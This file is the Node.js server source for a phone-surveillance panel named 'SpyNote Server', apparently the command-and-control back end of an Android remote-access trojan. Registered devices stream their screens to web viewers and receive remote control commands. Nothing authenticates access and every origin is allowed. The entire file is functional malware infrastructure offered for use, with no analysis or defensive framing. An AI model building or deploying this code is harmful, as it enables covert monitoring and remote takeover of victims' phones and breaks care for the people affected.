const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map(); // deviceId -> deviceInfo

// ✅ REST API
app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log(`🔌 New connection: ${socket.id}`);

    // 🔥 DEVICE REGISTRATION
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        console.log(`📱 Registering device: ${deviceId}`);
        
        if (deviceId) {
            const deviceData = {
                ...deviceInfo,
                connected: true,
                lastSeen: Date.now(),
                webSockets: [] // Track web clients watching this device
            };
            devices.set(deviceId, deviceData);
            socket.join(`device_${deviceId}`); // ✅ Device-specific room
            
            // Notify ALL web clients
            io.emit('devices-update', Array.from(devices.entries()));
            console.log(`✅ Device "${deviceId}" registered in room device_${deviceId}`);
        }
    });

    // 🔥 SCREEN FRAME - MOST IMPORTANT FIX!
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        console.log(`📺 Frame received from ${deviceId} (${data.width}x${data.height})`);
        
        if (devices.has(deviceId)) {
            // ✅ Broadcast to ALL web clients watching this device
            const roomName = `device_${deviceId}`;
            socket.to(roomName).emit('screen-update', data);
            
            // Log viewers count
            const viewers = io.sockets.adapter.rooms.get(roomName)?.size || 0;
            console.log(`📺 Frame BROADCAST to ${viewers} viewers in room ${roomName}`);
        } else {
            console.log(`❌ Device ${deviceId} not registered`);
        }
    });

    // ✅ CONTROL COMMANDS
    socket.on('control', (data) => {
        const deviceId = data.deviceId;
        const action = data.action;
        console.log(`🎮 Control ${action} to ${deviceId}`);
        
        if (devices.has(deviceId)) {
            const roomName = `device_${deviceId}`;
            socket.to(roomName).emit('control', data);
            console.log(`✅ Control sent to room ${roomName}`);
        }
    });

    // Web client selects device - join room
    socket.on('select-device', (deviceId) => {
        const roomName = `device_${deviceId}`;
        socket.join(roomName);
        console.log(`👁️ Web client ${socket.id} joined ${roomName}`);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 Disconnected: ${socket.id}`);
        
        // Update device status if it was a device socket
        for (const [deviceId, device] of devices.entries()) {
            if (device.socketId === socket.id) {
                device.connected = false;
                console.log(`📱 Device ${deviceId} went offline`);
            }
        }
        
        io.emit('devices-update', Array.from(devices.entries()));
    });
});

// Keep devices alive heartbeat
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, device] of devices.entries()) {
        if (now - device.lastSeen > 30000) { // 30 sec timeout
            if (device.connected) {
                console.log(`⏰ Device ${deviceId} timeout`);
                device.connected = false;
                io.emit('devices-update', Array.from(devices.entries()));
            }
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 SpyNote Server LIVE on http://0.0.0.0:${PORT}`);
    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
    console.log(`📱 Phone connect → LIVE SCREEN GUARANTEED!\n`);
});
